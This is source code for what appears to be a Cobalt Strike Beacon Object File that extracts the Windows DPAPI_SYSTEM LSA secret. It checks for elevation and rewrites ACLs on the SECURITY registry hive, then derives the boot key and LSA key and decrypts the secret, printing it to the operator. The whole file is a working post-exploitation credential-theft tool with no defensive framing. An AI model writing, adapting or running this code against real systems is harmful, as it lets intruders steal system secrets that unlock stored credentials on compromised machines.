#include <windows.h>
#include <winreg.h>
#include <advapi.h>
#include <ntsecapi.h>
#include <beacon.h>

#define DACL_SECURITY_INFORMATION 0x00000004
#define SECURITY_DESCRIPTOR_REVISION 1
#define SECURITY_DESCRIPTOR_MIN_LENGTH 20
#define GRANT_ACCESS 1
#define NO_INHERITANCE 0
#define TRUSTEE_IS_SID 0
#define TRUSTEE_IS_USER 1

typedef void *BCRYPT_HANDLE;
typedef void *BCRYPT_ALG_HANDLE;
typedef void *BCRYPT_HASH_HANDLE;
typedef void *BCRYPT_KEY_HANDLE;

typedef struct _TOKEN_ELEVATION_SCRIPT {
    DWORD TokenIsElevated;
} TOKEN_ELEVATION_SCRIPT;

typedef struct _TRUSTEE_A_SCRIPT {
    struct _TRUSTEE_A_SCRIPT *pMultipleTrustee;
    DWORD MultipleTrusteeOperation;
    DWORD TrusteeForm;
    DWORD TrusteeType;
    LPSTR ptstrName;
} TRUSTEE_A_SCRIPT;

typedef struct _EXPLICIT_ACCESS_A_SCRIPT {
    DWORD grfAccessPermissions;
    DWORD grfAccessMode;
    DWORD grfInheritance;
    TRUSTEE_A_SCRIPT Trustee;
} EXPLICIT_ACCESS_A_SCRIPT;

BCRYPT$BCryptOpenAlgorithmProvider: i32 (ptr, ptr, ptr, u32);
BCRYPT$BCryptCloseAlgorithmProvider: i32 (ptr, u32);
BCRYPT$BCryptSetProperty: i32 (ptr, ptr, ptr, u32, u32);
BCRYPT$BCryptGenerateSymmetricKey: i32 (ptr, ptr, ptr, u32, ptr, u32, u32);
BCRYPT$BCryptDestroyKey: i32 (ptr);
BCRYPT$BCryptDecrypt: i32 (ptr, ptr, u32, ptr, ptr, u32, ptr, u32, ptr, u32);
BCRYPT$BCryptCreateHash: i32 (ptr, ptr, ptr, u32, ptr, u32, u32);
BCRYPT$BCryptDestroyHash: i32 (ptr);
BCRYPT$BCryptHashData: i32 (ptr, ptr, u32, u32);
BCRYPT$BCryptFinishHash: i32 (ptr, ptr, u32, u32);
ADVAPI32$SetEntriesInAclA: u32 (u32, ptr, ptr, ptr);

PSECURITY_DESCRIPTOR g_original_acls[2] = { NULL, NULL };
char *g_lsa_reg_keys[2] = {
    "SECURITY\\Policy\\Secrets\\DPAPI_SYSTEM\\CurrVal",
    "SECURITY\\Policy\\PolEKList"
};

void StringToByteArray(char *hex, BYTE *bytes, DWORD len) {
    DWORD i;
    int j;
    char c;
    BYTE value;
    BYTE nibble;

    for (i = 0; i < len; i++) {
        value = 0;
        for (j = 0; j < 2; j++) {
            c = hex[(i * 2) + j];
            nibble = 0;
            if (c >= '0' && c <= '9') {
                nibble = (BYTE)(c - '0');
            } else if (c >= 'A' && c <= 'F') {
                nibble = (BYTE)(c - 'A' + 10);
            } else if (c >= 'a' && c <= 'f') {
                nibble = (BYTE)(c - 'a' + 10);
            }
            value = (BYTE)((value << 4) | nibble);
        }
        bytes[i] = value;
    }
}

void ByteArrayToString(BYTE *bytes, DWORD len, char *str) {
    char *hex_chars;
    DWORD i;

    hex_chars = "0123456789abcdef";
    for (i = 0; i < len; i++) {
        str[i * 2] = hex_chars[(bytes[i] >> 4) & 0x0f];
        str[(i * 2) + 1] = hex_chars[bytes[i] & 0x0f];
    }
    str[len * 2] = 0;
}

BOOL LSASHA256Hash(BYTE *key, DWORD key_len, BYTE *raw_data, DWORD raw_data_len, BYTE *hash, formatp *out) {
    BCRYPT_ALG_HANDLE h_alg;
    BCRYPT_HASH_HANDLE h_hash;
    NTSTATUS status;
    int i;
    BOOL success;

    h_alg = NULL;
    h_hash = NULL;
    success = FALSE;

    status = BCRYPT$BCryptOpenAlgorithmProvider(&h_alg, L"SHA256", NULL, 0);
    if (status < 0) {
        BeaconFormatPrintf(out, "[!] BCryptOpenAlgorithmProvider (SHA256) failed: 0x%08lX\n", status);
        goto sha_cleanup;
    }
    status = BCRYPT$BCryptCreateHash(h_alg, &h_hash, NULL, 0, NULL, 0, 0);
    if (status < 0) {
        BeaconFormatPrintf(out, "[!] BCryptCreateHash failed: 0x%08lX\n", status);
        goto sha_cleanup;
    }
    status = BCRYPT$BCryptHashData(h_hash, key, key_len, 0);
    if (status < 0) {
        BeaconFormatPrintf(out, "[!] BCryptHashData (key) failed: 0x%08lX\n", status);
        goto sha_cleanup;
    }
    for (i = 0; i < 1000; i++) {
        status = BCRYPT$BCryptHashData(h_hash, raw_data, raw_data_len, 0);
        if (status < 0) {
            BeaconFormatPrintf(out, "[!] BCryptHashData (iteration %d) failed: 0x%08lX\n", i, status);
            goto sha_cleanup;
        }
    }
    status = BCRYPT$BCryptFinishHash(h_hash, hash, 32, 0);
    if (status < 0) {
        BeaconFormatPrintf(out, "[!] BCryptFinishHash failed: 0x%08lX\n", status);
        goto sha_cleanup;
    }
    success = TRUE;

sha_cleanup:
    if (h_hash != NULL) BCRYPT$BCryptDestroyHash(h_hash);
    if (h_alg != NULL) BCRYPT$BCryptCloseAlgorithmProvider(h_alg, 0);
    return success;
}

BOOL LSAAESDecrypt(BYTE *key, BYTE *data, DWORD data_len, BYTE **plaintext, DWORD *plaintext_len, formatp *out) {
    BCRYPT_ALG_HANDLE h_alg;
    BCRYPT_KEY_HANDLE h_key;
    NTSTATUS status;
    BYTE *buffer;
    DWORD chunks;
    DWORD i;
    DWORD j;
    DWORD offset;
    DWORD copy_len;
    BYTE chunk[16];
    BYTE decrypted_chunk[16];
    BYTE iv[16];
    ULONG decrypted_chunk_len;
    BOOL success;

    h_alg = NULL;
    h_key = NULL;
    buffer = NULL;
    success = FALSE;

    status = BCRYPT$BCryptOpenAlgorithmProvider(&h_alg, L"AES", NULL, 0);
    if (status < 0) {
        BeaconFormatPrintf(out, "[!] BCryptOpenAlgorithmProvider failed: 0x%08lX\n", status);
        goto aes_cleanup;
    }
    status = BCRYPT$BCryptSetProperty(h_alg, L"ChainingMode", (PUCHAR)L"ChainingModeCBC", 32, 0);
    if (status < 0) {
        BeaconFormatPrintf(out, "[!] BCryptSetProperty (CBC mode) failed: 0x%08lX\n", status);
        goto aes_cleanup;
    }

    chunks = (data_len + 15) / 16;
    *plaintext_len = chunks * 16;
    buffer = (BYTE *)calloc(1, *plaintext_len);
    if (buffer == NULL) {
        BeaconFormatPrintf(out, "[!] Failed to allocate memory for plaintext\n");
        goto aes_cleanup;
    }

    for (i = 0; i < chunks; i++) {
        offset = i * 16;
        copy_len = 16;
        if (offset + 16 > data_len) {
            copy_len = data_len - offset;
        }

        MSVCRT$memset(chunk, 0, sizeof(chunk));
        MSVCRT$memset(decrypted_chunk, 0, sizeof(decrypted_chunk));
        MSVCRT$memset(iv, 0, sizeof(iv));
        for (j = 0; j < copy_len; j++) {
            chunk[j] = data[offset + j];
        }

        status = BCRYPT$BCryptGenerateSymmetricKey(h_alg, &h_key, NULL, 0, key, 32, 0);
        if (status < 0) {
            BeaconFormatPrintf(out, "[!] BCryptGenerateSymmetricKey failed for chunk %lu: 0x%08lX\n", i, status);
            goto aes_cleanup;
        }

        decrypted_chunk_len = 0;
        status = BCRYPT$BCryptDecrypt(h_key, chunk, 16, NULL, iv, sizeof(iv), decrypted_chunk, 16, &decrypted_chunk_len, 0);
        if (status < 0) {
            BeaconFormatPrintf(out, "[!] BCryptDecrypt failed for chunk %lu: 0x%08lX\n", i, status);
            goto aes_cleanup;
        }
        MSVCRT$memcpy(buffer + offset, decrypted_chunk, 16);

        BCRYPT$BCryptDestroyKey(h_key);
        h_key = NULL;
    }

    *plaintext = buffer;
    buffer = NULL;
    success = TRUE;

aes_cleanup:
    if (buffer != NULL) free(buffer);
    if (h_key != NULL) BCRYPT$BCryptDestroyKey(h_key);
    if (h_alg != NULL) BCRYPT$BCryptCloseAlgorithmProvider(h_alg, 0);
    return success;
}

BOOL IsHighIntegrity(void) {
    BOOL elevated;
    HANDLE token;
    TOKEN_ELEVATION_SCRIPT elevation;
    DWORD size;

    elevated = FALSE;
    token = NULL;
    MSVCRT$memset(&elevation, 0, sizeof(elevation));
    size = 0;

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &token)) {
        return FALSE;
    }
    if (ADVAPI32$GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
        elevated = elevation.TokenIsElevated ? TRUE : FALSE;
    }
    KERNEL32$CloseHandle(token);
    return elevated;
}

BOOL ModifyRegistryPermissions(BOOL enable, formatp *out) {
    HANDLE token;
    PTOKEN_USER token_user;
    DWORD token_info_length;
    BOOL success;
    HKEY key;
    PSECURITY_DESCRIPTOR new_sd;
    PACL old_dacl;
    PACL new_dacl;
    BOOL dacl_present;
    BOOL dacl_defaulted;
    EXPLICIT_ACCESS_A_SCRIPT explicit_access;
    DWORD security_descriptor_size;
    DWORD acl_result;
    LONG result;
    int i;

    token = NULL;
    token_user = NULL;
    token_info_length = 0;
    success = FALSE;
    key = NULL;
    new_sd = NULL;
    old_dacl = NULL;
    new_dacl = NULL;

    if (enable) {
        BeaconFormatPrintf(out, "[+] Modifying registry permissions to enable LSA secret access\n");

        if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &token)) {
            BeaconFormatPrintf(out, "[!] Failed to open process token: %lu\n", KERNEL32$GetLastError());
            goto acl_cleanup;
        }

        ADVAPI32$GetTokenInformation(token, TokenUser, NULL, 0, &token_info_length);
        token_user = (PTOKEN_USER)calloc(1, token_info_length);
        if (token_user == NULL) goto acl_cleanup;

        if (!ADVAPI32$GetTokenInformation(token, TokenUser, token_user, token_info_length, &token_info_length)) {
            BeaconFormatPrintf(out, "[!] Failed to get token information: %lu\n", KERNEL32$GetLastError());
            goto acl_cleanup;
        }

        for (i = 0; i < 2; i++) {
            result = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, g_lsa_reg_keys[i], 0, READ_CONTROL | WRITE_DAC, &key);
            if (result != ERROR_SUCCESS) {
                BeaconFormatPrintf(out, "[!] Failed to open registry key %s for permission modification: %ld\n", g_lsa_reg_keys[i], result);
                goto acl_cleanup;
            }

            security_descriptor_size = 0;
            result = ADVAPI32$RegGetKeySecurity(key, DACL_SECURITY_INFORMATION, NULL, &security_descriptor_size);
            if (result != ERROR_INSUFFICIENT_BUFFER) {
                BeaconFormatPrintf(out, "[!] Failed to get security descriptor size for %s: %ld\n", g_lsa_reg_keys[i], result);
                goto acl_cleanup;
            }

            g_original_acls[i] = (PSECURITY_DESCRIPTOR)calloc(1, security_descriptor_size);
            if (g_original_acls[i] == NULL) goto acl_cleanup;

            result = ADVAPI32$RegGetKeySecurity(key, DACL_SECURITY_INFORMATION, g_original_acls[i], &security_descriptor_size);
            if (result != ERROR_SUCCESS) {
                BeaconFormatPrintf(out, "[!] Failed to get security descriptor for %s: %ld\n", g_lsa_reg_keys[i], result);
                goto acl_cleanup;
            }

            old_dacl = NULL;
            dacl_present = FALSE;
            dacl_defaulted = FALSE;
            if (!ADVAPI32$GetSecurityDescriptorDacl(g_original_acls[i], &dacl_present, &old_dacl, &dacl_defaulted)) {
                BeaconFormatPrintf(out, "[!] Failed to get DACL from security descriptor: %lu\n", KERNEL32$GetLastError());
                goto acl_cleanup;
            }

            MSVCRT$memset(&explicit_access, 0, sizeof(explicit_access));
            explicit_access.grfAccessPermissions = KEY_READ;
            explicit_access.grfAccessMode = GRANT_ACCESS;
            explicit_access.grfInheritance = NO_INHERITANCE;
            explicit_access.Trustee.TrusteeForm = TRUSTEE_IS_SID;
            explicit_access.Trustee.TrusteeType = TRUSTEE_IS_USER;
            explicit_access.Trustee.ptstrName = (LPSTR)token_user->User.Sid;

            acl_result = ADVAPI32$SetEntriesInAclA(1, &explicit_access, old_dacl, &new_dacl);
            if (acl_result != ERROR_SUCCESS) {
                BeaconFormatPrintf(out, "[!] Failed to create new ACL: %lu\n", acl_result);
                goto acl_cleanup;
            }

            new_sd = (PSECURITY_DESCRIPTOR)calloc(1, SECURITY_DESCRIPTOR_MIN_LENGTH);
            if (new_sd == NULL) goto acl_cleanup;

            if (!ADVAPI32$InitializeSecurityDescriptor(new_sd, SECURITY_DESCRIPTOR_REVISION)) {
                BeaconFormatPrintf(out, "[!] Failed to initialize security descriptor: %lu\n", KERNEL32$GetLastError());
                goto acl_cleanup;
            }

            if (!ADVAPI32$SetSecurityDescriptorDacl(new_sd, TRUE, new_dacl, FALSE)) {
                BeaconFormatPrintf(out, "[!] Failed to set security descriptor DACL: %lu\n", KERNEL32$GetLastError());
                goto acl_cleanup;
            }

            result = ADVAPI32$RegSetKeySecurity(key, DACL_SECURITY_INFORMATION, new_sd);
            if (result != ERROR_SUCCESS) {
                BeaconFormatPrintf(out, "[!] Failed to set registry key security for %s: %ld\n", g_lsa_reg_keys[i], result);
                goto acl_cleanup;
            }

            BeaconFormatPrintf(out, "[+] Successfully modified permissions for %s\n", g_lsa_reg_keys[i]);
            free(new_sd);
            new_sd = NULL;
            KERNEL32$LocalFree(new_dacl);
            new_dacl = NULL;
            ADVAPI32$RegCloseKey(key);
            key = NULL;
        }
        success = TRUE;
    } else {
        BeaconFormatPrintf(out, "[+] Restoring original registry permissions\n");
        for (i = 0; i < 2; i++) {
            if (g_original_acls[i] != NULL) {
                result = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, g_lsa_reg_keys[i], 0, WRITE_DAC, &key);
                if (result == ERROR_SUCCESS) {
                    result = ADVAPI32$RegSetKeySecurity(key, DACL_SECURITY_INFORMATION, g_original_acls[i]);
                    if (result == ERROR_SUCCESS) {
                        BeaconFormatPrintf(out, "[+] Successfully restored permissions for %s\n", g_lsa_reg_keys[i]);
                    } else {
                        BeaconFormatPrintf(out, "[!] Failed to restore permissions for %s: %ld\n", g_lsa_reg_keys[i], result);
                    }
                    ADVAPI32$RegCloseKey(key);
                    key = NULL;
                }
                free(g_original_acls[i]);
                g_original_acls[i] = NULL;
            }
        }
        success = TRUE;
    }

acl_cleanup:
    if (token != NULL) KERNEL32$CloseHandle(token);
    if (token_user != NULL) free(token_user);
    if (key != NULL) ADVAPI32$RegCloseKey(key);
    if (new_sd != NULL) free(new_sd);
    if (new_dacl != NULL) KERNEL32$LocalFree(new_dacl);
    return success;
}

BOOL GetRegKeyValue(char *key_path, BYTE **data, DWORD *data_size, formatp *out) {
    HKEY key;
    BYTE *buffer;
    BOOL success;
    DWORD cb_data;
    LONG result;

    key = NULL;
    buffer = NULL;
    success = FALSE;
    cb_data = 0;

    result = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, key_path, 0, KEY_READ, &key);
    if (result != ERROR_SUCCESS) {
        BeaconFormatPrintf(out, "[!] Error opening registry key %s: %ld\n", key_path, result);
        goto reg_cleanup;
    }

    result = ADVAPI32$RegQueryValueExA(key, NULL, NULL, NULL, NULL, &cb_data);
    if (result != ERROR_SUCCESS) {
        BeaconFormatPrintf(out, "[!] Error querying registry value size for %s: %ld\n", key_path, result);
        goto reg_cleanup;
    }

    buffer = (BYTE *)calloc(1, cb_data);
    if (buffer == NULL) goto reg_cleanup;

    result = ADVAPI32$RegQueryValueExA(key, NULL, NULL, NULL, buffer, &cb_data);
    if (result != ERROR_SUCCESS) {
        BeaconFormatPrintf(out, "[!] Error reading registry value for %s: %ld\n", key_path, result);
        goto reg_cleanup;
    }

    *data = buffer;
    *data_size = cb_data;
    buffer = NULL;
    success = TRUE;

reg_cleanup:
    if (key != NULL) ADVAPI32$RegCloseKey(key);
    if (buffer != NULL) free(buffer);
    return success;
}

BOOL GetBootKey(BYTE *bootkey, formatp *out) {
    char *keys[4];
    char scrambled_key[33];
    char key_path[256];
    char class_val[1024];
    DWORD class_len;
    HKEY key;
    BOOL success;
    BYTE skey[16];
    BYTE descramble[16];
    LONG result;
    int i;

    keys[0] = "JD";
    keys[1] = "Skew1";
    keys[2] = "GBG";
    keys[3] = "Data";
    key = NULL;
    success = FALSE;
    MSVCRT$memset(scrambled_key, 0, sizeof(scrambled_key));
    MSVCRT$memset(skey, 0, sizeof(skey));
    descramble[0] = 0x8; descramble[1] = 0x5; descramble[2] = 0x4; descramble[3] = 0x2;
    descramble[4] = 0xb; descramble[5] = 0x9; descramble[6] = 0xd; descramble[7] = 0x3;
    descramble[8] = 0x0; descramble[9] = 0x6; descramble[10] = 0x1; descramble[11] = 0xc;
    descramble[12] = 0xe; descramble[13] = 0xa; descramble[14] = 0xf; descramble[15] = 0x7;

    for (i = 0; i < 4; i++) {
        MSVCRT$memset(key_path, 0, sizeof(key_path));
        MSVCRT$memset(class_val, 0, sizeof(class_val));
        MSVCRT$strcpy(key_path, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\");
        MSVCRT$strcat(key_path, keys[i]);
        class_len = sizeof(class_val);

        result = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, key_path, 0, KEY_READ, &key);
        if (result != ERROR_SUCCESS) {
            BeaconFormatPrintf(out, "[!] Error opening %s: %ld\n", key_path, result);
            goto boot_cleanup;
        }

        result = ADVAPI32$RegQueryInfoKeyA(key, class_val, &class_len, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        if (result != ERROR_SUCCESS) {
            BeaconFormatPrintf(out, "[!] Error querying %s: %ld\n", key_path, result);
            goto boot_cleanup;
        }
        MSVCRT$strcat(scrambled_key, class_val);
        ADVAPI32$RegCloseKey(key);
        key = NULL;
    }

    if (MSVCRT$strlen(scrambled_key) != 32) {
        BeaconFormatPrintf(out, "[!] Invalid scrambled key length: %d (expected 32)\n", MSVCRT$strlen(scrambled_key));
        goto boot_cleanup;
    }

    StringToByteArray(scrambled_key, skey, 16);
    for (i = 0; i < 16; i++) {
        bootkey[i] = skey[descramble[i]];
    }
    success = TRUE;

boot_cleanup:
    if (key != NULL) ADVAPI32$RegCloseKey(key);
    return success;
}

BOOL GetLSAKey(BYTE *lsa_key, formatp *out) {
    BYTE bootkey[16];
    char bootkey_hex[48];
    BYTE *encrypted_struct;
    DWORD struct_size;
    BYTE *plaintext;
    DWORD plaintext_len;
    DWORD encrypted_data_len;
    BYTE *encrypted_data;
    BYTE temp_key_data[32];
    BYTE tmp_key[32];
    BYTE *remainder;
    DWORD remainder_len;
    BOOL success;
    int i;

    encrypted_struct = NULL;
    plaintext = NULL;
    success = FALSE;
    MSVCRT$memset(bootkey, 0, sizeof(bootkey));
    MSVCRT$memset(bootkey_hex, 0, sizeof(bootkey_hex));
    MSVCRT$memset(tmp_key, 0, sizeof(tmp_key));

    if (!GetBootKey(bootkey, out)) {
        BeaconFormatPrintf(out, "[!] Failed to get boot key\n");
        goto lsakey_cleanup;
    }
    ByteArrayToString(bootkey, 16, bootkey_hex);
    BeaconFormatPrintf(out, "[+] Successfully obtained boot key: %s\n", bootkey_hex);

    if (!GetRegKeyValue("SECURITY\\Policy\\PolEKList", &encrypted_struct, &struct_size, out)) {
        BeaconFormatPrintf(out, "[!] Failed to get LSA key encrypted struct\n");
        goto lsakey_cleanup;
    }
    if (struct_size < 28) {
        BeaconFormatPrintf(out, "[!] LSA key struct too small: %lu bytes (expected at least 28)\n", struct_size);
        goto lsakey_cleanup;
    }

    BeaconFormatPrintf(out, "[+] Successfully read LSA key encrypted struct (%lu bytes)\n", struct_size);
    encrypted_data_len = struct_size - 28;
    encrypted_data = encrypted_struct + 28;
    if (encrypted_data_len < 32) {
        BeaconFormatPrintf(out, "[!] LSA encrypted data too small: %lu bytes (expected at least 32)\n", encrypted_data_len);
        goto lsakey_cleanup;
    }

    for (i = 0; i < 32; i++) temp_key_data[i] = encrypted_data[i];
    if (!LSASHA256Hash(bootkey, 16, temp_key_data, 32, tmp_key, out)) goto lsakey_cleanup;

    remainder = encrypted_data + 32;
    remainder_len = encrypted_data_len - 32;
    if (!LSAAESDecrypt(tmp_key, remainder, remainder_len, &plaintext, &plaintext_len, out)) {
        BeaconFormatPrintf(out, "[!] Failed to decrypt LSA key struct\n");
        goto lsakey_cleanup;
    }

    if (plaintext_len < 100) {
        BeaconFormatPrintf(out, "[!] Decrypted LSA key struct too small: %lu bytes (expected at least 100)\n", plaintext_len);
        goto lsakey_cleanup;
    }

    for (i = 0; i < 32; i++) {
        lsa_key[i] = plaintext[68 + i];
    }
    success = TRUE;

lsakey_cleanup:
    if (encrypted_struct != NULL) free(encrypted_struct);
    if (plaintext != NULL) free(plaintext);
    return success;
}

BOOL GetLSASecret(char *secret_name, BYTE **secret, DWORD *secret_len, formatp *out) {
    BYTE lsa_key[32];
    BYTE *key_data;
    DWORD key_data_size;
    BYTE *plaintext;
    DWORD plaintext_len;
    BYTE *result;
    DWORD encrypted_data_len;
    BYTE *encrypted_data;
    BYTE temp_key_data[32];
    BYTE tmp_key[32];
    BYTE *remainder;
    DWORD remainder_len;
    char key_path[256];
    BOOL success;
    int i;

    key_data = NULL;
    plaintext = NULL;
    result = NULL;
    success = FALSE;
    MSVCRT$memset(lsa_key, 0, sizeof(lsa_key));
    MSVCRT$memset(tmp_key, 0, sizeof(tmp_key));

    BeaconFormatPrintf(out, "[+] Attempting to extract LSA secret: %s\n", secret_name);

    if (!ModifyRegistryPermissions(TRUE, out)) {
        BeaconFormatPrintf(out, "[!] Failed to modify registry permissions\n");
        goto secret_cleanup;
    }

    if (!GetLSAKey(lsa_key, out)) {
        BeaconFormatPrintf(out, "[!] Failed to get LSA key\n");
        goto secret_cleanup;
    }
    BeaconFormatPrintf(out, "[+] Successfully obtained LSA key\n");

    MSVCRT$memset(key_path, 0, sizeof(key_path));
    MSVCRT$strcpy(key_path, "SECURITY\\Policy\\Secrets\\");
    MSVCRT$strcat(key_path, secret_name);
    MSVCRT$strcat(key_path, "\\CurrVal");

    if (!GetRegKeyValue(key_path, &key_data, &key_data_size, out)) {
        BeaconFormatPrintf(out, "[!] Failed to get secret data from registry\n");
        goto secret_cleanup;
    }
    if (key_data_size < 28) {
        BeaconFormatPrintf(out, "[!] Secret data too small: %lu bytes (expected at least 28)\n", key_data_size);
        goto secret_cleanup;
    }
    BeaconFormatPrintf(out, "[+] Successfully read encrypted secret data (%lu bytes)\n", key_data_size);

    encrypted_data_len = key_data_size - 28;
    encrypted_data = key_data + 28;
    if (encrypted_data_len < 32) {
        BeaconFormatPrintf(out, "[!] Encrypted data too small: %lu bytes (expected at least 32)\n", encrypted_data_len);
        goto secret_cleanup;
    }

    for (i = 0; i < 32; i++) temp_key_data[i] = encrypted_data[i];
    if (!LSASHA256Hash(lsa_key, 32, temp_key_data, 32, tmp_key, out)) goto secret_cleanup;

    remainder = encrypted_data + 32;
    remainder_len = encrypted_data_len - 32;
    if (!LSAAESDecrypt(tmp_key, remainder, remainder_len, &plaintext, &plaintext_len, out)) {
        BeaconFormatPrintf(out, "[!] Failed to decrypt secret data\n");
        goto secret_cleanup;
    }
    BeaconFormatPrintf(out, "[+] Successfully decrypted secret data (%lu bytes)\n", plaintext_len);

    if (MSVCRT$strcmp(secret_name, "DPAPI_SYSTEM") == 0) {
        if (plaintext_len < 60) {
            BeaconFormatPrintf(out, "[!] Decrypted DPAPI_SYSTEM data too small: %lu bytes (expected at least 60)\n", plaintext_len);
            goto secret_cleanup;
        }
        *secret_len = 40;
        result = (BYTE *)calloc(1, 40);
        if (result == NULL) goto secret_cleanup;
        MSVCRT$memcpy(result, plaintext + 20, 40);
        *secret = result;
        result = NULL;
        success = TRUE;
    } else {
        BeaconFormatPrintf(out, "[!] LSA Secret '%s' not implemented!\n", secret_name);
    }

secret_cleanup:
    ModifyRegistryPermissions(FALSE, out);
    if (key_data != NULL) free(key_data);
    if (plaintext != NULL) free(plaintext);
    if (result != NULL) free(result);
    return success;
}

do {
    BYTE *secret;
    DWORD secret_len;
    char hex_string[81];
    BOOL success;
    formatp out;
    char *output;
    int output_length;

    secret = NULL;
    secret_len = 0;
    success = FALSE;
    MSVCRT$memset(hex_string, 0, sizeof(hex_string));
    BeaconFormatAlloc(&out, 8192);

    BeaconFormatPrintf(&out, "DPAPI_SYSTEM LSA Secret Extractor (BOF)\n");
    BeaconFormatPrintf(&out, "=======================================\n\n");

    if (!IsHighIntegrity()) {
        BeaconFormatPrintf(&out, "[!] You need to be in high integrity to extract LSA secrets!\n");
        BeaconFormatPrintf(&out, "[!] Please run this from an elevated Beacon context\n");
        goto script_cleanup;
    }

    BeaconFormatPrintf(&out, "[+] Running in high integrity context\n");
    if (!GetLSASecret("DPAPI_SYSTEM", &secret, &secret_len, &out)) {
        BeaconFormatPrintf(&out, "[!] Failed to extract LSA secret\n");
        goto script_cleanup;
    }
    if (secret == NULL || secret_len < 40) {
        BeaconFormatPrintf(&out, "[!] Failed to extract secret or invalid secret length\n");
        goto script_cleanup;
    }

    BeaconFormatPrintf(&out, "[+] Successfully extracted DPAPI_SYSTEM secret!\n");
    ByteArrayToString(secret, 40, hex_string);
    BeaconFormatPrintf(&out, "[+] DPAPI_SYSTEM key: %s\n", hex_string);
    success = TRUE;

script_cleanup:
    if (secret != NULL) free(secret);
    if (success) {
        BeaconFormatPrintf(&out, "[+] Script execution completed successfully\n");
    } else {
        BeaconFormatPrintf(&out, "[!] Script execution failed\n");
    }
    output = BeaconFormatToString(&out, &output_length);
    BeaconOutput(CALLBACK_OUTPUT, output, output_length);
    BeaconFormatFree(&out);
} while (0);
